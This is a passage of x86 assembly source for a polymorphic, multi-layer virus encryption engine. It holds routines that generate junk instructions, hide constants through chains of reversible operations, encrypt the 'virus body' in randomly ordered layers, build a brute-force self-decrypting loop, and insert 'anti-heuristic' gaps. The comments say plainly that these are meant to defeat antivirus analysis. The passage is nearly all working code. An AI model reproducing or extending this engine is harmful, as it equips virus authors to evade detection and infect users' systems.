g_compare:

		; do not recursived - because it's few registers
		cmp	byte ptr [ebp+recursive_level],01h
		jnz	a_compare

		; have we some free place in rnd_fill ?
		cmp	byte ptr [ebp+compare_index],00h
		jz	a_compare

		; this garbage only in the main loop
		cmp	byte ptr [ebp+gl_index_reg],-1
		jz	a_compare

		; save used-regs
		mov	al,[ebp+used_regs]
		push	eax

		; select a free base-reg to DEC
		call	 gen_garbage
		call	ppe_get_empty_reg
		call	__reg_to_bcd
		or	[ebp+used_regs],ah
		mov	al,48h			;DEC
		or	al,byte ptr [ebx]
		stosb

		call	gen_garbage

		; build CMP instruction
		mov	edx,ebx
	__gc_new_reg:
		call	ppe_get_reg
		cmp	ebx,edx 		;i don't want same regz
		jz	__gc_new_reg
		mov	ah,byte ptr [edx]	;reg to AH
		shl	ah,03h			; * 8
		or	ah,al
		or	ah,0C0h
		mov	al,3Bh			;CMP ...
		stosw

		call	gen_garbage_no_flags

		; build JNZ jmp
		mov	ax,850Fh		;JNZ far signature
		stosw
		movzx	eax,byte ptr [ebp+compare_index]
		call	ppe_get_rnd_range	;select <compare_index>
		mov	eax,[ebp+compare_buffer+04h*eax]
		add	eax,[ebp+poly_start]
		push	eax
		sub	eax,edi
		sub	eax,00000004h
		stosd

		call	gen_garbage

		; build JMP to rnd_fill
		pop	ecx			;EDI of rnd_fill_jmp in ECX
		mov	al,0E9h 		;JMP far signature
		mov	byte ptr [ecx],al
		mov	eax,edi
		sub	eax,ecx
		sub	eax,00000005h
		mov	dword ptr [ecx+00000001h],eax

		call	gen_garbage

		; destroy all rnd_fill buffers
		mov	byte ptr [ebp+compare_index],00h

		; restore used_regs
		pop	eax
		mov	[ebp+used_regs],al

a_compare:	ret

;ÄÄÄ´ function to fix delta for copro operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;If we generated offset of free memory (by __copro_get_mem)
		;then it's more then time to use delta.
		;
		;input:    EBX = offset to reg
__copro_fix_delta:
		mov	al,03h			;ADD instruction
		mov	ah,byte ptr [ebx]
		shl	ah,3
		or	ah,byte ptr [ebp+gl_index_reg]
		or	ah,0C0h
		stosw
		ret

__copro_unfix_delta:
		mov	al,2Bh			;SUB instruction
		mov	ah,byte ptr [ebx]
		shl	ah,3
		or	ah,byte ptr [ebp+gl_index_reg]
		or	ah,0C0h
		stosw
		ret

;ÄÄÄ´ function to crypt a destination value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;   ÀÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÙ

		;---------------------------------------------------------
		;This function is for crypt a real value  which we want to
		;hide. I use only base-reg (eax,edi...) because If I would
		;like to  introduce the  coprocessor I'd have to  use FILD
		;and FIST instruction: FILD qword ptr [edi],  where  EDI I
		;wanted generate. At first I  generate code  for  encode a
		;destination value  and I find out a crypt  value.  During
		;encoding I save a opposite instruction to stack  (add <=>
		;sub). I could not to save decode instructions into a spe-
		;cial buffer because I didn't know a real size - the stack
		;is better for this.
		;
		;input:       EAX=destination value
		;	       BL=destionation register (not in BCD)
		;
		;used instructions: ADD opposite SUB and on the contrary
		;		    ROL opposite ROR
		;		    XOR reg <==> XOR reg
		;		    NOT reg <==> NOT reg
		;		    MOV reg1,reg2 <==> MOV reg2,reg1
		;
		;do you have anything else ?
		;
		;and now... example:
		;   * I want to generate number 0x402CC1 to EDX register
		;		    MOV   ESI, 1985FDD6
		;		    ROL   ESI, BB
		;		    MOV   EAX, ESI
		;		    NOT   EAX
		;		    MOV   EDX, EAX
		;		    SUB   EDX, 4FF3A350  ->EDX = 0x402CC1
		;
		;This is only example but reality it other... better !!!
		;
		actual_reg	db	?	;where we've our number which we're generating
		future_reg	db	?	;our destination register
		actual_instr	db	?	;actual instruction in generate
		old_place	dd	?	;where's start crypt value
		;
ppe_crypt_value:

		pusha

		mov	ecx,eax 		;save destination value
		mov	[ebp+old_place ],edi
		mov	[ebp+actual_reg],bl
		mov	[ebp+future_reg],bl

		; save destination value to destination reg
		mov	al,0B8h
		or	al,bl
		stosb				;select destination reg
		mov	eax,ecx
		stosd				;save destination value

		; how many instruction we'll use
		mov	eax,00000007h
		call	ppe_get_rnd_range
		inc	eax
		mov	byte ptr [ebp+actual_instr],al

		push	12345678h		;flag to stack
	__cv_next_loop:
		mov	eax,00000003h		;may I change register ?
		call	ppe_get_rnd_range
		or	eax,eax
		jnz	__cv_continue

		call	ppe_get_empty_reg	;i want a free register
		mov	al,08Bh
		mov	ah,byte ptr [ebx]	;my future reg32
		cmp	ah,byte ptr [ebp+actual_reg]
		jz	__cv_next_loop		;blah - mov ecx,ecx ??
		shl	ah,3
		or	ah,byte ptr [ebp+actual_reg]
		or	ah,0C0h
		stosw				;finish but now i must create opposite for decode
		mov	al,byte ptr [ebx]
		mov	ah,byte ptr [ebp+actual_reg]
		shl	ah,3
		or	ah,al
		or	ah,0C0h
		mov	byte ptr [ebp+actual_reg],al
		mov	al,08Bh
		push	ax			;ax = decode mov

	__cv_continue:
		mov	eax,(end_num_code - tbl_num_code) / 04h
		call	ppe_get_rnd_range

		lea	esi,[ebp+tbl_num_code+4*eax]
		lodsb				;load where we have encode instruction
		lodsw				;AH = base_reg, AL = id_operation
		or	ah,[ebp+actual_reg]
		push	ax			;save because of separate actual_reg
		stosw
		lodsb				;imm(X) = 3rd_number * 8
		mov	dl,al
		push	ax			;now, we must generate imm
	__cv_generate_imm:			;imm32 = (add,sub) reg32,imm32
		or	dl,dl			;imm8  = (rol,ror) reg32,imm8
		jz	__cv_opposite_code	;imm0  = not reg32
		call	ppe_get_rnd32
		rol	ebx,8			;save rnd number to EBX
		mov	bl,al
		stosb
		dec	dl
		jmp	__cv_generate_imm

	__cv_opposite_code:
		pop	ax			;ax = imm(X)
		pop	cx			;ch = reg32, cl = encode instruction
	__cv_oc_generate_imm:
		or	al,al			;is it imm0 ?
		jz	__cv_oc_imm_ok
		dec	esp			;save imm to stack
		mov	byte ptr ss:[esp],bl
		ror	ebx,8			;next number in imm
		dec	al
		jmp	__cv_oc_generate_imm

	__cv_oc_imm_ok:
		lea	esi,[esi-4]		;esi = start of encode instruction
		lodsb				;AL = opposite instruction (add <=> sub)
		movsx	eax,al			;is it previous or next instruction ?
		add	esi,eax 		;esi = decode instruction
		lodsb
		lodsw				;al = (en/de)code instruction
		and	ch,00000111b		;separate reg only
		or	ah,ch			;change register
		push	ax			;save encode instruction to stack

		dec	byte ptr [ebp+actual_instr]
		jnz	__cv_next_loop

		;now, we must find out the crypt value
		mov	ax,0C08Bh
		or	ah,byte ptr [ebp+actual_reg]
		stosw				;save destination value to EAX
		mov	al,0C3h
		stosb				;ret = out of call

		;to find out crypt value we must call decode function
		;output:	eax = crypt value
		pusha
		call	dword ptr [ebp+old_place]
		mov	[esp].access_eax,eax
		popa

		;save into last_reg our crypt value
		mov	edi,[ebp+old_place]
		push	eax
		mov	al,0B8h
		or	al,byte ptr [ebp+actual_reg]
		stosb
		pop	eax
		stosd

		;now, we must write decode instructions to old EDI
	__cv_oc_out_of_stack:
		cmp	dword ptr ss:[esp],12345678h
		jz	__cv_oc_finish
		mov	al,byte ptr ss:[esp]
		inc	esp
		stosb
		jmp	__cv_oc_out_of_stack
	__cv_oc_finish:
		pop	eax			;flag from stack

		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ last decoding loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function encrypts virus body like 3rd decoding loop.
		;The algorithm is in front of the virus. It  means, multi-
		;layer algorithm is behind virus, then is jump to back and
		;then is next decoding loop.
		;
		__pllg_memory	dd	00000000h	;decoding loop mem
		__pllg_countreg db	00h		;counter register
		__pllg_indexreg db	00h		;index register
		__pllg_codereg	db	00h		;code register
		__pllg_lsize	dd	00000000h	;loop size
		;
ppe_lloop_generate:

		; save all registers
		pusha

		; allocate memory for decoding loop
		mov	eax,10000
		call	malloc
		mov	[ebp+__pllg_memory],eax
		mov	edi,eax

		; generate index and its register
		call	gen_garbage
	__pllg_new_reg:
		call	ppe_get_empty_reg
		cmp	al,00000100b
		jae	__pllg_new_reg
		call	__reg_to_bcd
		mov	bl,al
		mov	[ebp+__pllg_indexreg],bl
		or	[ebp+used_regs],ah
		mov	al,0E8h 	       ;CALL
		stosb
		xor	eax,eax
		stosd
		mov	al,58h
		add	al,[ebp+__pllg_indexreg]
		stosb
		mov	ax,0C081h
		add	ah,[ebp+__pllg_indexreg]
		stosw
		push	edi
		add	edi,00000004h	       ;do place for ADD

		; generate counter register
		call	gen_garbage
		call	ppe_get_empty_reg
		call	__reg_to_bcd
		mov	bl,al
		mov	[ebp+__pllg_countreg],al
		or	[ebp+used_regs],ah
		call	ppe_get_rnd32
		push	eax
		call	ppe_crypt_value

		; generate code register
		call	gen_garbage
		call	ppe_get_empty_reg
		call	__reg_to_bcd
		mov	bl,al
		mov	[ebp+__pllg_codereg],bl
		or	[ebp+used_regs],ah
		call	ppe_get_rnd32
		call	ppe_crypt_value

		; generate XOR machanism
		push	edi
		call	gen_garbage
		mov	ah,[ebp+__pllg_codereg]
		shl	ah,03h
		add	ah,[ebp+__pllg_indexreg]
		mov	al,31h
		stosw
		call	gen_garbage

		; generate next index value
		mov	ah,0C0h
		add	ah,[ebp+__pllg_indexreg]
		mov	al,83h
		stosw
		mov	al,04h
		stosb
		call	gen_garbage

		; geneerate next counter value
		mov	al,40h
		add	al,[ebp+__pllg_countreg]
		stosb
		call	gen_garbage

		; generate comparing
		mov	ax,0F881h
		add	ah,[ebp+__pllg_countreg]
		stosw
		mov	eax,[esp+4]
		add	eax,file_size shr 2
		stosd
		call	gen_garbage_no_flags
		mov	ax,850Fh		;JNZ identification
		stosw
		mov	eax,[esp]
		sub	eax,edi
		sub	eax,4
		stosd
		call	gen_garbage

		; generate do-nothing instructions
		mov	al,0C3h
		push	edi
		stosb
	__pllg_align:
		mov	eax,edi
		sub	eax,[ebp+__pllg_memory]
		mov	ebx,8
		xor	edx,edx
		div	ebx
		or	edx,edx
		jz	__pllg_finish
		mov	al,90h
		stosb
		jmp	__pllg_align
	__pllg_finish:

		; change index value
		mov	eax,edi
		sub	eax,[esp+0ch]
		add	eax,00000003h
		mov	ebx,[esp+0ch]
		mov	[ebx],eax

		; do place for this algorithm
		push	edi
		mov	esi,[ebp+mem_address]
		add	edi,esi
		sub	edi,[ebp+__pllg_memory]
		mov	ecx,edi
		sub	ecx,esi
		mov	[esi+__pllg_lsize-virus_start],ecx
		add	ecx,file_size
		mov	[ebp+file_size2],ecx
		mov	[ebp+file_size3],ecx
		shr	[ebp+file_size2],03h
		call	__movsd_back

		; copy this algorithm
		mov	esi,[ebp+__pllg_memory]
		mov	edi,[ebp+mem_address]
		pop	ecx
		sub	ecx,[ebp+__pllg_memory]
		rep	movsb

		; run that algorithm
		pusha
		mov	eax,[ebp+mem_address]
		call	eax
		popa
		mov	eax,[esp]
		sub	eax,[ebp+__pllg_memory]
		add	eax,[ebp+mem_address]
		mov	byte ptr [eax],90h

		; dealloc memory
		mov	eax,[ebp+__pllg_memory]
		call	mdealloc
		xor	eax,eax
		mov	[ebp+__pllg_memory],eax

		; restore all registers
		mov	[ebp+used_regs],00h
		add	esp,4*4
		popa
		ret

;ÄÄÄ´ multi-layer engine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function generates multi-layer map. And because I am
		;crazy, this is true multi-layer engine. So look here:
		;
		; Every polymorphic en-    vs.	 Every multi-layer engine
		; gine encodes l. this: 	 encodes  in  this   way:
		;      Â  (virus_start) 	    Â	      Â
		;      ³			    ³ 1st     ³ 2nd
		;      ³			    ³ layer   ³ layer
		;      ³			    ³	      ³
		;        (down or up)		    	            etc.
		;
		;But my multi-layer engine has these features:
		;   * randomly generated layer's movement (down or up)
		;   * maximal is 986 layers
		;   * typical is 68 layers
		;   * layers' buffer with gaps (anti-heuristic)
		;
		;My resulting coding progress:
		;      Â  Ú¿	     ù	     ù	   ¿  three layers
		;      ³Ú¿³³   ù   ù   ù   ù   ù   ´  five layers
		;      ³³³³³Ú¿ ù ù ù ù ù ù ù ù ù ù ´  seven layers
		;      ÀÙ³³³³³ ù ù ù ù ù ù ù ù ù ù Ù
		;	 ³³ÀÙ³
		;	 ÀÙ  ³
		;	     
		;
		;Here you can see I need layers buffer, where I have all
		;movement (down and up). Every byte has this structure:
		;
		;      8th bit (down/up), 7th-1st bit (+/- movement)
		;
		;Some equations:
		;  * maximum layers:
		;     ((file_size-2^7*4)/(layer_buf-file_size-2^7*4))/2=968
		;  * typical layers:
		;     2^7 * 4 * layer_buf / file_size = 68
		;
		;Where:
		;  * file_size = calculated for 18,000 bytes
		;  * layer_buf = calculated for 2,400 bytes
		;  * 2^7 = we have eight bites without one (+/-)
		;  * 4 = we use dword, not byte
		;
		;The layers buffer is behind polymorphic loop, and it cer-
		;tains anti-heuristic :), because in that buffer are gaps.
		;And these treatments are inside polydecoding loop.
		;
		;
		__mlg_map	dd	00000000h	;layers memory map
		__mlg_size	dd	00000000h	;size of layer buffer
		file_size2	dd	00000000h	;(file_size+3rd l.)/8
		file_size3	dd	00000000h	;file_size2 * 8
		;
ppe_mlayer_generate:

		; save all registers
		pusha

		; allocate memory for layer map
		push	00000000h		;number of encrypted bytes
		mov	eax,000000C9h		;get size of layers map
		call	ppe_get_rnd_range	;maximum is 2,600 bytes
		shl	eax,03h 		;multiply by eight
		add	eax,1000
		push	eax			;[ESP] = size of layers map
		shr	dword ptr [esp],03h	;divide by eight
		call	malloc			;allocate that memory
		mov	[ebp+__mlg_map],eax

		; generate eight parts
		mov	edi,[ebp+__mlg_map]	;EDI = memory layers map
		xor	ecx,ecx 		;ECX = actual part
		xor	edx,edx 		;EDX = position in layer
		call	__mlg_gen_max_movement
		mov	byte ptr [edi],al	;the first movement
		movzx	ebx,al			;EBX = position in vbody
		inc	edi			; + memory layer map
		inc	edx			; + pos in actual layer
	__mlg_next_movement:
		call	__mlg_gen_max_movement	;generate new movement (+/-)
		jc	__mlg_no_compare	;if AL==0, then "go up" flag
		push	eax
		mov	eax,00000003h		; 2 * DOWN, 1 * UP
		call	ppe_get_rnd_range
		or	al,al			;go back ? (it means UP !)
		pop	eax			;movement
		jnz	__mlg_go_down
		cmp	ebx,eax 		;EBX - EAX < 0 ?
		jb	__mlg_go_down		;if yes, go down, not up
	    __mlg_no_compare:
		sub	ebx,eax 		; = actul pos in vbody
		or	al,80h			;set "go up" flag
		jmp	$ + 00000004h
	    __mlg_go_down:
		add	ebx,eax 		; = actual pos in vbody
		mov	byte ptr [edi],al	;write new movement (+/-)
		inc	edi			; + memory layer map
		inc	edx			; + pos in actual layer
	__mlg_compare:
		cmp	edx,[esp]		;EDX == size of layers map/8
		jb	__mlg_continue
		inc	ecx			;next part
		xor	edx,edx 		;position in layer
		add	[esp+00000004h],ebx	;number of encrypted bytes
		cmp	ecx,00000008h		;was it last part ?
		jnz	__mlg_no_last
		mov	ebx,[ebp+file_size3]	;file_size + 3rd_loop
		sub	ebx,[esp+00000004h]	;encrypted bytes
		neg	ebx			; - EBX
		jmp	$ + 00000008h
	    __mlg_no_last:
		sub	ebx,[ebp+file_size2]	;EBX < file_size2 ?
		mov	esi,ebx 		;my the only one empty reg :)
		bt	esi,3Fh
		jnc	__mlg_continue		;no bytes to down ? ESI > 0 ?
	    __mlg_no_last_next:
		call	__mlg_gen_max_movement_without_test
		push	esi			;ESI + EAX <= 0, then okay
		add	esi,eax 		;ESI + EAX >  0, then again
		or	esi,esi 		;set (Z)ero flag
		bt	esi,3Fh 		;set (C)arry flag
		pop	esi
		jc	$ + 00000004h		;all right
		jnz	__mlg_no_last_next	;ESI + EAX > 0
		add	[esp+00000004h],eax	;number of encrypted bytes
		mov	byte ptr [edi],al	;and write that...
		inc	edi			; + memory layer map
		inc	edx			; + pos in actual layer
		add	ebx,eax 		;position in vbody
		add	esi,eax 		;ESI += EAX, bytes to down
		bt	esi,3Fh 		;ESI > 0 ?
		jc	__mlg_no_last_next
	__mlg_continue:
		cmp	ecx,00000008h		;last part ?
		jnz	__mlg_next_movement	;next and next loop...
		sub	edi,[ebp+__mlg_map]	;number of encrypted bytes
		mov	[ebp+__mlg_size],edi

		; encrypt the encrypted virus body by 3rd decoding loop :)
		mov	esi,[ebp+__mlg_map]	;layers memory map
		mov	edi,[ebp+mem_address]
		mov	edx,[ebp+__mlg_size]	;size of layers buffer
		mov	ebx,[ebp+code_value]
	__mlg_next_byte:
		lodsb				;load movement
		movzx	ecx,al			;convert to ECX & 7Fh
		and	cl,7Fh			;clear (+/-) flag
		sub	ebx,[ebp+code_value_add] ;damn bug !
	__mlg_next_dword:
		cmp	byte ptr [ebp+crypt_style],02h
		jz	__mlg_xor
		cmp	byte ptr [ebp+crypt_style],01h
		jz	__mlg_add
		sub	byte ptr [edi],bl
		jmp	__mlg_next_value
	__mlg_add:
		add	byte ptr [edi],bl
		jmp	__mlg_next_value
	__mlg_xor:
		xor	byte ptr [edi],bl
	__mlg_next_value:
		inc	edi			;next value (+)
		rol	ebx,01h 		;bits rotate
		test	al,80h			;check that flag
		jz	__mlg_go_cow
		sub	edi,00000002h		;next value (-)
	__mlg_go_cow:
		dec	cl			;next byte (value)
		jnz	__mlg_next_dword
		bt	eax,7			;test 7th bit
		jc	__mlg_back
		test	byte ptr [esi],80h	;forward and back now ?
		jz	__mlg_fback
		dec	edi
		jmp	__mlg_fback
	__mlg_back:
		test	byte ptr [esi],80h	;back and forward now ?
		jnz	__mlg_fback
		inc	edi
	__mlg_fback:
		dec	edx			;next movement
		jnz	__mlg_next_byte

		; generate the 5th number of CRC-getting
	__pbi_again:
		mov	eax,00DFFFFFh		;maximum searching number
		call	ppe_get_rnd_range
		cmp	eax,10000h
		jb	__pbi_again
		mov	[ebp+__pbi_last_num],eax
		sub	ebx,eax
		mov	[ebp+__pbi_add_num],ebx

		; restore all registers
		add	esp,00000008h
		popa
		ret

	__mlg_gen_max_movement_without_test:
		mov	eax,00000080h		;generate <0,128) number
		call	ppe_get_rnd_range
		or	al,al
		jz	__mlg_gen_max_movement_without_test
		ret

	__mlg_gen_max_movement:
		call	__mlg_gen_max_movement_without_test
		cmp	ebx,[ebp+file_size2]
		jz	__mlg_gmm_failed
		push	eax			;i haven't any empty reg
		add	eax,ebx
		cmp	eax,[ebp+file_size2]	;EBX+EAX > file_size2 ?
		pop	eax			;if yes, generate other
		ja	__mlg_gen_max_movement	;number
		test	al,0F9h 		;hidden STC instruction
	    __mlg_gmm_failed equ $-1
		ret

;ÄÄÄ´ brute-attack engine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;Welcome to my brute-attack engine  in poly-decoding loop.
		;At first I generate five valuez and their checksum,  then
		;I'll store that checksum and I will find right five value
		;by its checksum. Maximal value of 5th number is 0xDFFFFF.
		;This number I'll find per 0.82 second on P233. And I know
		;it's very good result.
		;
		;I would like to thank Darkman/29A for his:
		;   * "RDEA" article in 29A #3 issue
		;   * ideas and theory
		;
		;This function is only for you... your ideas...
		;
		;
		__pbi_nums	dd	4 dup(0)	;global numbers
		__pbi_last_num	dd	00000000h	;last number
		__pbi_add_num	dd	00000000h	;absolute number
		__pbi_start_crc dd	00000000h	;startup checksum
		__pbi_last_crc	dd	00000000h	;finishing checksum
		__pbi_regs	db	3 dup(0)	;three registers
		;
ppe_brute_init:

		; save all registers
		pusha

		; change "poly_start" value
		mov	edi,[ebp+mem_address]
		add	edi,[ebp+file_size3]	;new position
		mov	[ebp+poly_start],edi	;file_size + 3rd loop

		; generate four numbers
		mov	ecx,00000004h		;four numbers
	__pbi_next_number:
		call	ppe_get_rnd32		;generate random number
		mov	[ebp+__pbi_nums+ecx*4-4],eax
		loop	__pbi_next_number

		; calculate some checksums...
		xor	ecx,ecx 		;counter
		xor	eax,eax 		;calculate register
	__pbi_calculate:
		add	eax,[ebp+__pbi_nums+ecx*4]
		rol	eax,01h
		xor	eax,0ACD78FA3h
		inc	ecx			;next number
		cmp	ecx,00000004h		;ECX == numbers - 1 ?
		jnz	__pbi_cfinish
		mov	[ebp+__pbi_start_crc],eax ;save that value
	__pbi_cfinish:
		cmp	ecx,00000005h
		jnz	__pbi_calculate
		mov	[ebp+__pbi_last_crc],eax ;save checksum

		; generate three needed registers
		mov	ecx,00000003h		;three registers
	__pbi_next_register:
		call	ppe_get_empty_reg
		call	__reg_to_bcd
		mov	[ebp+__pbi_regs+ecx-1],al
		or	[ebp+used_regs],ah
		loop	__pbi_next_register

		; generate old and new checksum
		call	gen_garbage		  ;use old checksum it means
		mov	eax,[ebp+__pbi_start_crc] ;without last right value
		mov	bl,[ebp+__pbi_regs]	  ;the first register
		call	ppe_crypt_value
		call	gen_garbage		  ;and use finishing crc
		mov	eax,[ebp+__pbi_last_crc]
		mov	bl,[ebp+__pbi_regs+01h]   ;the second register
		call	ppe_crypt_value
		call	gen_garbage
		xor	eax,eax 		;calculating register
		mov	bl,[ebp+__pbi_regs+02h] ;the third register
		call	ppe_crypt_value

		; own algorithm
		push	edi			;startup address
		mov	al,40h
		or	al,[ebp+__pbi_regs]	;old_reg++
		stosb
		mov	ah,[ebp+__pbi_regs+02h] ;mov calc_reg,old_reg
		shl	ah,03h
		or	ah,[ebp+__pbi_regs]	;old reg
		or	ah,0C0h
		mov	al,8Bh			;MOV instruction
		stosw
		mov	ax,0C0D1h		;rol calc_reg,01h
		or	ah,[ebp+__pbi_regs+02h]
		stosw
		mov	ax,0F081h		;xor reg32,imm32
		or	ah,[ebp+__pbi_regs+02h]
		stosw
		mov	eax,0ACD78FA3h		;special value
		stosd
		mov	ah,[ebp+__pbi_regs+02h]
		shl	ah,03h
		or	ah,[ebp+__pbi_regs+01h]
		or	ah,0C0h
		mov	al,3Bh
		stosw
		mov	ax,850Fh		;JNZ identification
		stosw
		pop	eax			;"go back" offset
		sub	eax,edi
		sub	eax,4
		stosd
		call	gen_garbage
		mov	byte ptr [ebp+used_regs],00h
		mov	al,[ebp+code_reg]	;code register
		call	__reg_to_bcd
		or	[ebp+used_regs],ah
		xchg	ah,al
		shl	ah,03h
		or	ah,[ebp+__pbi_regs]
		or	ah,0C0h
		mov	al,8Bh			;mov code_reg,reg32
		stosw
		call	gen_garbage
		mov	ax,0E881h		;sub code_reg,start_crc
		or	ah,[ebp+code_reg]
		stosw
		mov	eax,[ebp+__pbi_start_crc]
		stosd
		call	gen_garbage
		mov	ax,0C081h		;ADD instruction
		or	ah,[ebp+code_reg]
		stosw
		mov	eax,[ebp+__pbi_add_num]
		stosd
		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ generate code to get delta-address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function gets delta. Useful forr "g_repeat", and all
		;calls and jmps garbages, for all iluzo jumps and so on...
		;
		__ppe_gd_call	 dd	 00000000h
		;
ppe_get_delta:

		; save registers
		pusha

		; prepare CALL
		call	gen_garbage
		mov	al,0E8h
		stosb
		stosd
		mov	[ebp+__ppe_gd_call],edi
		push	edi
		call	ppe_gen_rnd_block
		mov	eax,edi
		pop	esi
		sub	eax,esi
		mov	dword ptr [esi-00000004h],eax
		call	gen_garbage

		; now, we must active the global index register
		mov	al,[ebp+gl_index_reg2]
		mov	[ebp+gl_index_reg],al
		call	__reg_to_bcd
		or	[ebp+used_regs],ah
		mov	byte ptr [ebp+compare_index],00h

		mov	al,58h
		or	al,byte ptr [ebp+gl_index_reg]
		stosb				;POP base-reg32
		call	gen_garbage_no_flags	;'cause delta isn't finished

		; we must fix real address
		mov	eax,[ebp+__ppe_gd_call]
		sub	eax,[ebp+mem_address]
		sub	eax,[ebp+file_size3]
		push	eax

		; ADD or SUB ?
		call	ppe_get_rnd32
		and	al,1
		jz	__ppe_gd_sub

		; fix with ADD --> add reg32, fix_value
		mov	ax,0C081h
		or	ah,byte ptr [ebp+gl_index_reg]
		stosw
		pop	eax
		neg	eax
		jmp	__ppe_gd_fix_done

		; fix with SUB --> sub reg32, -fix_value
	__ppe_gd_sub:
		mov	ax,0E881h
		or	ah,byte ptr [ebp+gl_index_reg]
		stosw
		pop	eax

	__ppe_gd_fix_done:
		stosd

		mov	[esp],edi
		popa
		ret

;ÄÄÄ´ generate layer gaps (anti-heuristic) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function adds some gaps in multi-layers buffer. What
		;does it mean, gaps ? So, you will generate layers  map by
		;"ppe_mlayer_generate" function. There are only  movements
		;and AV can find that buffer and do all  alone, but here I
		;will generate some gaps,  and when  my poly find  certain
		;offset in that buffer, i'll add some value = anti-heuris-
		;tic. All is hiden by "ppe_crypt_value" as well.
		;
		;Behaviour:
		;  * get number of gaps
		;  * generate their position and size in layer buffer
		;  * run "bubble sort" algorithm
		;  * do gaps in buffer (generate random movement)
		;  * change positions
		;
		__pglg_num	dd	00000000h	;number of gaps
		__pglg_where	dd	8 dup(0,0)	;gaps, their size
		;
ppe_get_layer_gaps:

		; save all registers
		pusha

		; negate all movements
		mov	ecx,[ebp+__mlg_size]	;number of movements
		mov	esi,[ebp+__mlg_map]
	__pglg_negate:
		mov	ah,[esi]
		btc	ax,15			;negate 7th bit
		mov	[esi],ah
		inc	esi
		loop	__pglg_negate

		; exchange all movements (from end 2 start)
		mov	ecx,[ebp+__mlg_size]
		mov	esi,[ebp+__mlg_map]
	__pglg_exchange:
		mov	al,[esi+ecx-1]
		xchg	al,[esi]
		mov	[esi+ecx-1],al
		dec	ecx
		dec	ecx
		inc	esi
		cmp	ecx,00000002h
		jae	__pglg_exchange

		; generate random gaps
		mov	eax,00000009h		;number of gaps - 1
		call	ppe_get_rnd_range
		mov	[ebp+__pglg_num],eax	;actual gaps
		or	eax,eax 		;no gaps ?
		jz	__pglg_finish
		mov	edx,eax

	__pglg_next_gap:
		mov	eax,[ebp+__mlg_size]	;memory buffer size
		call	ppe_get_rnd_range
		or	eax,eax 		;don't support 1st place
		jz	__pglg_next_gap
		mov	[ebp+__pglg_where+edx*8-8],eax ;save position
		mov	eax,00000010h		;<0,10h) gap
		call	ppe_get_rnd_range
		inc	eax			;this was fucking bug
		mov	[ebp+__pglg_where+edx*8-4],eax ;and its size
		dec	edx			;next gap
		jnz	__pglg_next_gap
		cmp	[ebp+__pglg_num],00000001h
		jz	__pglg_moving

		; use "bubble sort"
		mov	ebx,[ebp+__pglg_num]		;for(x=7;x<=1;x--)
		mov	ecx,ebx 			;for(y=8-x;y<=1;y--)
		dec	ecx				;if(p[y]>p[y-1]){
	__pglg_bagain:					;x=p[y+1];p[y+1]=p[y]
		mov	edx,ebx 			;p[y]=x}
		sub	edx,ecx
	__pglg_bnext:					;...and it's all :)
		mov	eax,[ebp+__pglg_where+edx*8]
		cmp	eax,[ebp+__pglg_where+edx*8-8]
		ja	__pglg_bno_change
		xchg	eax,[ebp+__pglg_where+edx*8-8]
		mov	[ebp+__pglg_where+edx*8],eax
	__pglg_bno_change:
		dec	edx
		jnz	__pglg_bnext
		dec	ecx
		jnz	__pglg_bagain

		; it's time to do some place in the buffer
	__pglg_moving:
		mov	edx,[ebp+__pglg_num]	;number of gaps
	__pglg_next_moving:
		mov	ecx,[ebp+__mlg_size]	;buffer's size
		mov	esi,[ebp+__pglg_where+edx*8-8] ;position
		sub	ecx,esi
		add	esi,[ebp+__mlg_map]	;memory layers map
		mov	edi,[ebp+__pglg_where+edx*8-4] ;gap size
		add	ecx,edi
		add	edi,esi 		;destination place
		push	esi
		call	__movsd_back
		mov	ecx,[ebp+__pglg_where+edx*8-4]
		pop	edi			;do some random movement
		push	ecx
		mov	bl,[edi]		;get last bit (+/-) ?
	__pglg_generate:
		call	ppe_get_rnd32		;generate that...
		bt	bx,7			;to (C)arry
		jc	__pglg_2nd
		and	al,01111111b
		jmp	__pglg_1st
	    __pglg_2nd:
		or	al,10000000b		;set last bit
	    __pglg_1st:
		stosb				;...and store one
		loop	__pglg_generate
		pop	ecx

		; well, build next anti-heuristic...
		add	[ebp+__mlg_size],ecx	; + gap size
		dec	edx
		jnz	__pglg_next_moving

		; change positions
		xor	eax,eax
	__pglg_cpos:
		mov	ebx,[ebp+__pglg_num]	;this was last fucking bug,
		dec	ebx			;belive me, it's needless
		cmp	edx,ebx 		;to explain something :)
		jz	__pglg_finish
		inc	edx
		add	eax,[ebp+__pglg_where+edx*8-4]
		add	[ebp+__pglg_where+edx*8],eax
		jmp	__pglg_cpos

	__pglg_finish:
		popa
		ret

;ÄÄÄ´ generate code to set index for decode-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

		;---------------------------------------------------------
		;This function gets start of virus body to reg32.
		;
ppe_get_index:

		; save all registers
		pusha
		call	gen_garbage

		; crypt a start of decoding
		mov	al,[ebp+index_reg]
		movzx	ebx,al
		call	__reg_to_bcd
		or	[ebp+used_regs],ah
		mov	eax,-1			;start of decoding...
		call	ppe_crypt_value 	;go !
		lea	ebx,[ebp+tbl_regs+ebx*02h]
